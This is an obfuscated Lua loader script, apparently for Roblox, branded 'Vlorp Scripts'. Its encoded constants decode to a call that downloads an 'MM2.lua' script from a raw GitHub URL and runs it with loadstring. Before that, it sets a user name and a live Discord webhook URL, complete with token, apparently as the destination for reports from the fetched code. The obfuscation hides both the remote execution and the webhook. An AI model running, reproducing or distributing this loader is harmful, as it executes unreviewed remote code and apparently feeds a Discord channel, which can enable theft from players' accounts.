--[[
 __      ___                     _____           _       _       
 \ \    / / |                   / ____|         (_)     | |      
  \ \  / /| | ___  _ __ _ __   | (___   ___ _ __ _ _ __ | |_ ___ 
   \ \/ / | |/ _ \| '__| '_ \   \___ \ / __| '__| | '_ \| __/ __|
    \  /  | | (_) | |  | |_) |  ____) | (__| |  | | |_) | |_\__ \
     \/   |_|\___/|_|  | .__/  |_____/ \___|_|  |_| .__/ \__|___/
                       | |                        | |            
                       |_|                        |_|     

]]

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v88=0;local v89;while true do if (v88==0) then v89=v2(v0(v30,16));if v19 then local v119=0;local v120;while true do if (v119==0) then v120=v5(v89,v19);v19=nil;v119=1;end if (v119==1) then return v120;end end else return v89;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v90=(v31/((5 -3)^(v32-(2 -1))))%((3 -1)^(((v33-1) -(v32-(2 -1))) + (620 -(555 + (941 -(282 + 595)))))) ;return v90-(v90%((2569 -(1523 + 114)) -(857 + 74))) ;else local v91=((513 + 57) -(367 + 201))^(v32-(928 -(214 + 713))) ;return (((v31%(v91 + v91))>=v91) and (1 + 0)) or (0 + 0) ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35=(0 + 0) -0 ;local v36;local v37;while true do if (v35==(1065 -(68 + 997))) then v36,v37=v1(v16,v18,v18 + (1272 -(226 + 1044)) );v18=v18 + (8 -6) ;v35=1;end if (v35==1) then return (v37 * (373 -(32 + 19 + 66))) + v36 ;end end end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + (960 -(892 + 65)) );v18=v18 + 4 ;return (v41 * (40022563 -23245347)) + (v40 * (121138 -55602)) + (v39 * 256) + v38 ;end local function v24() local v42=v23();local v43=v23();local v44=1 -0 ;local v45=(v20(v43,1,(368 + 2) -(87 + 263) ) * ((182 -(67 + 113))^(24 + 8))) + v42 ;local v46=v20(v43,51 -30 ,31);local v47=((v20(v43,24 + 8 )==(3 -2)) and  -(953 -(802 + 150))) or 1 ;if (v46==(0 -0)) then if (v45==(0 -0)) then return v47 * (0 + 0) ;else local v111=997 -(915 + (873 -(368 + 423))) ;while true do if ((0 -0)==v111) then v46=1 + 0 ;v44=0 -0 ;break;end end end elseif (v46==(3234 -(1069 + 118))) then return ((v45==((0 -0) -0)) and (v47 * (1/(0 -0)))) or (v47 * NaN) ;end return v8(v47,v46-(178 + (863 -(10 + 8))) ) * (v44 + (v45/((3 -1)^(199 -147)))) ;end local function v25(v48) local v49=442 -(416 + 26) ;local v50;local v51;while true do if ((6 -4)==v49) then v51={};for v112=1 + 0 , #v50 do v51[v112]=v2(v1(v3(v50,v112,v112)));end v49=3;end if (v49==(1139 -(116 + 1022))) then v50=v3(v16,v18,(v18 + v48) -(1 -0) );v18=v18 + v48 ;v49=440 -(145 + (1219 -926)) ;end if (v49==((255 + 178) -(44 + 386))) then return v6(v51);end if (v49==(1486 -(998 + 488))) then v50=nil;if  not v48 then local v118=0 + 0 ;while true do if (v118==(0 + 0)) then v48=v23();if (v48==(772 -(201 + 571))) then return "";end break;end end end v49=1;end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return function(v92,v93,v94,v95,v96,v97,v98,v99,v100) local v101=(function() return 0 + 0 ;end)();local v92=(function() return;end)();local v93=(function() return;end)();while true do local v110=(function() return 574 -(507 + 67) ;end)();while true do if (v110==(1749 -(1013 + 736))) then if (v101==1) then local v123=(function() return 0;end)();while true do if (v123==(0 + 0)) then local v164=(function() return 0;end)();while true do if (v164~=0) then else while true do if (v92==0) then v93=(function() return v94();end)();if (v95(v93, #"[", #"<")~=(0 -0)) then else local v174=(function() return 0;end)();local v175=(function() return;end)();local v176=(function() return;end)();local v177=(function() return;end)();local v178=(function() return;end)();while true do if (v174==1) then v177=(function() return nil;end)();v178=(function() return nil;end)();v174=(function() return 7 -5 ;end)();end if (v174~=0) then else local v179=(function() return 0;end)();while true do if (v179~=0) then else v175=(function() return 0;end)();v176=(function() return nil;end)();v179=(function() return 868 -(550 + 317) ;end)();end if (v179==(1 -0)) then v174=(function() return 1;end)();break;end end end if (v174==2) then while true do if (v175~= #"asd") then else if (v95(v177, #"-19", #"19(")== #"\\") then v178[ #".dev"]=(function() return v96[v178[ #"0836"]];end)();end v97[v98]=(function() return v178;end)();break;end if (v175==2) then local v181=(function() return 0 -0 ;end)();local v182=(function() return;end)();while true do if (0~=v181) then else v182=(function() return 0 -0 ;end)();while true do if (v182==0) then if (v95(v177, #"~", #",")== #"|") then v178[287 -(134 + 151) ]=(function() return v96[v178[2]];end)();end if (v95(v177,2,2)== #"[") then v178[ #"gha"]=(function() return v96[v178[ #"91("]];end)();end v182=(function() return 1666 -(970 + 695) ;end)();end if ((1 -0)~=v182) then else v175=(function() return  #"91(";end)();break;end end break;end end end if (v175==(1990 -(582 + 1408))) then local v183=(function() return 0;end)();local v184=(function() return;end)();while true do if (v183==(0 -0)) then v184=(function() return 0 -0 ;end)();while true do if (v184==0) then v176=(function() return v95(v93,7 -5 , #"xxx");end)();v177=(function() return v95(v93, #"0313",1830 -(1195 + 629) );end)();v184=(function() return 1 -0 ;end)();end if ((242 -(187 + 54))==v184) then v175=(function() return  #"\\";end)();break;end end break;end end end if (v175~= #"\\") then else local v185=(function() return 780 -(162 + 618) ;end)();local v186=(function() return;end)();while true do if (v185==(0 + 0)) then v186=(function() return 0 + 0 ;end)();while true do if (v186~=1) then else v175=(function() return 2;end)();break;end if (v186==(0 -0)) then v178=(function() return {v99(),v99(),nil,nil};end)();if (v176==(0 + 0)) then local v190=(function() return 0;end)();local v191=(function() return;end)();while true do if ((1636 -(1373 + 263))~=v190) then else v191=(function() return 1000 -(451 + 549) ;end)();while true do if (v191~=(0 + 0)) then else v178[ #"-19"]=(function() return v99();end)();v178[ #".dev"]=(function() return v99();end)();break;end end break;end end elseif (v176== #".") then v178[ #"asd"]=(function() return v100();end)();elseif (v176==(2 -0)) then v178[ #"asd"]=(function() return v100() -((2 -0)^16) ;end)();elseif (v176== #"xnx") then local v196=(function() return 1384 -(746 + 638) ;end)();local v197=(function() return;end)();while true do if (v196~=(0 + 0)) then else v197=(function() return 0;end)();while true do if (v197~=(0 -0)) then else v178[ #"-19"]=(function() return v100() -(2^(357 -(218 + 123))) ;end)();v178[ #".dev"]=(function() return v99();end)();break;end end break;end end end v186=(function() return 1;end)();end end break;end end end end break;end end end break;end end return v92,v93,v94,v95,v96,v97,v98,v99,v100;end end end end end if (v101~=0) then else local v124=(function() return 0;end)();local v125=(function() return;end)();while true do if (v124==(1581 -(1535 + 46))) then v125=(function() return 0;end)();while true do if (v125==1) then v101=(function() return 1;end)();break;end if (v125==(0 + 0)) then v92=(function() return 0;end)();v93=(function() return nil;end)();v125=(function() return 1;end)();end end break;end end end break;end end end end;end)();local v53=(function() return function(v102,v103,v104) local v105=(function() return 0;end)();local v106=(function() return;end)();while true do if (v105==0) then v106=(function() return 0;end)();while true do if (v106==0) then local v126=(function() return 0 + 0 ;end)();while true do if (v126==(560 -(306 + 254))) then v102[v103-#"[" ]=(function() return v104();end)();return v102,v103,v104;end end end end break;end end end;end)();local v54=(function() return {};end)();local v55=(function() return {};end)();local v56=(function() return {};end)();local v57=(function() return {v54,v55,nil,v56};end)();local v58=(function() return v23();end)();local v59=(function() return {};end)();for v67= #"<",v58 do local v68=(function() return 0 -0 ;end)();local v69=(function() return;end)();local v70=(function() return;end)();local v71=(function() return;end)();while true do if (v68==(1468 -(899 + 568))) then v71=(function() return nil;end)();while true do if (1~=v69) then else if (v70== #">") then v71=(function() return v21()~=(0 + 0) ;end)();elseif (v70==2) then v71=(function() return v24();end)();elseif (v70== #"-19") then v71=(function() return v25();end)();end v59[v67]=(function() return v71;end)();break;end if (v69~=(0 -0)) then else local v122=(function() return 603 -(268 + 335) ;end)();while true do if (v122~=(291 -(60 + 230))) then else v69=(function() return 573 -(426 + 146) ;end)();break;end if (v122==(0 + 0)) then v70=(function() return v21();end)();v71=(function() return nil;end)();v122=(function() return 1;end)();end end end end break;end if (v68~=0) then else v69=(function() return 1456 -(282 + 1174) ;end)();v70=(function() return nil;end)();v68=(function() return 1;end)();end end end v57[ #"19("]=(function() return v21();end)();for v72= #"{",v23() do FlatIdent_2FD19,Descriptor,v21,v20,v59,v54,v72,v22,v23=(function() return v52(FlatIdent_2FD19,Descriptor,v21,v20,v59,v54,v72,v22,v23);end)();end for v73= #"}",v23() do v55,v73,v28=(function() return v53(v55,v73,v28);end)();end return v57;end local function v29(v61,v62,v63) local v64=v61[(2316 -(363 + 1141)) -(569 + 242) ];local v65=v61[322 -(53 + 267) ];local v66=v61[1 + 2 ];return function(...) local v74=v64;local v75=v65;local v76=v66;local v77=v27;local v78=2 -1 ;local v79= -(1 + 0);local v80={};local v81={...};local v82=v12("#",...) -(1 + 0) ;local v83={};local v84={};for v107=1251 -(721 + 530) ,v82 do if ((4029<=4853) and (v107>=v76)) then v80[v107-v76 ]=v81[v107 + (1272 -(945 + 326)) ];else v84[v107]=v81[v107 + (2 -1) ];end end local v85=(v82-v76) + 1 + 0 ;local v86;local v87;while true do v86=v74[v78];v87=v86[701 -(271 + 429) ];if (v87<=(1 + 4)) then if (v87<=(2 + 0)) then if (v87<=(1500 -(1408 + 92))) then if ((v84[v86[1088 -((2041 -(1183 + 397)) + 625) ]]==v86[1292 -(993 + 295) ]) or (516>3434)) then v78=v78 + 1 + 0 ;else v78=v86[2 + 1 ];end elseif (v87>(1172 -(418 + 753))) then for v166=v86[1 + 1 ],v86[7 -4 ] do v84[v166]=nil;end else local v129=v86[(11 -7) -2 ];v84[v129]=v84[v129](v13(v84,v129 + 1 ,v79));end elseif (v87<=3) then v84[v86[1 + 1 + 0 ]]();elseif ((4046>=3033) and (2350>1155) and (v87>(2 + 2))) then v84[v86[1 + 1 ]]=v63[v86[532 -(406 + 123) ]];else local v133=v86[1771 -(1749 + 20) ];local v134=v84[v86[380 -(142 + 176 + 59) ]];v84[v133 + 1 + 0 ]=v134;v84[v133]=v134[v86[1326 -(1249 + 73) ]];end elseif (v87<=(3 + 5)) then if (v87<=(1151 -(466 + 679))) then do return;end elseif ((v87>(16 -9)) or (2719<=1447)) then local v138=v86[5 -(1978 -(1913 + 62)) ];local v139,v140=v77(v84[v138](v13(v84,v138 + (1901 -(106 + 1794)) ,v86[1 + 2 ])));v79=(v140 + v138) -(1 + 0 + 0) ;local v141=0 -0 ;for v168=v138,v79 do v141=v141 + 1 + (0 -0) ;v84[v168]=v139[v141];end else v63[v86[3]]=v84[v86[2 + 0 ]];end elseif (v87<=(24 -15)) then v78=v86[117 -(4 + 110) ];elseif ((v87==(594 -((1990 -(565 + 1368)) + 527))) or (4134<3926)) then local v144;local v145,v146;local v147;local v148;v84[v86[4 -(7 -5) ]]=v63[v86[1430 -((1702 -(1477 + 184)) + 1386) ]];v78=v78 + (104 -(17 + 86)) ;v86=v74[v78];v148=v86[2 + 0 ];v147=v84[v86[756 -(239 + 514) ]];v84[v148 + 1 ]=v147;v84[v148]=v147[v86[2 + (2 -0) ]];v78=v78 + ((1 + 0) -0) ;v86=v74[v78];v84[v86[2 + 0 ]]=v86[8 -5 ];v78=v78 + ((1023 -(564 + 292)) -(122 + 44)) ;v86=v74[v78];v148=v86[2 -0 ];v145,v146=v77(v84[v148](v13(v84,v148 + (3 -2) ,v86[(4 -1) + 0 ])));v79=(v146 + v148) -(1 + 0) ;v144=0 -0 ;for v171=v148,v79 do v144=v144 + (66 -(30 + 35)) ;v84[v171]=v145[v144];end v78=v78 + 1 + 0 ;v86=v74[v78];v148=v86[(2 -1) + 1 ];v84[v148]=v84[v148](v13(v84,v148 + (1258 -(1043 + 214)) ,v79));v78=v78 + ((307 -(244 + 60)) -2) ;v86=v74[v78];v84[v86[1214 -(323 + 889) ]]();v78=v78 + 1 + 0 ;v86=v74[v78];v78=v86[3];else v84[v86[5 -3 ]]=v86[3 + 0 ];end v78=v78 + ((447 + 134) -(361 + 219)) ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!0A3O00028O00026O00F03F030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403433O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F536E6F777956342F566C6F7270536372697074732F6D61696E2F2O4D322E6C756103083O00757365724E616D65030D3O00446973632O6F6B69655F63617403073O00776562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3132373938323134333635373O3531362O302F65763762455A496D31633265566B49656B5666714A725634384A355A724B754474704944374F4B4F566669535A6B31526A4249317659704C676C7541667743676F4F6B4800223O00120B3O00014O0002000100013O00264O0002000100010004093O0002000100120B000100013O00262O0001000F000100020004093O000F0001001205000200033O00120A000300043O00202O00030003000500122O000500066O000300056O00023O00024O00020001000100044O0021000100262O00010005000100010004093O0005000100120B000200013O00262O00020019000100010004093O0019000100120B000300083O001207000300073O00120B0003000A3O001207000300093O00120B000200023O00262O00020012000100020004093O0012000100120B000100023O0004093O000500010004093O001200010004093O000500010004093O002100010004093O000200012O00063O00017O00",v9(),...);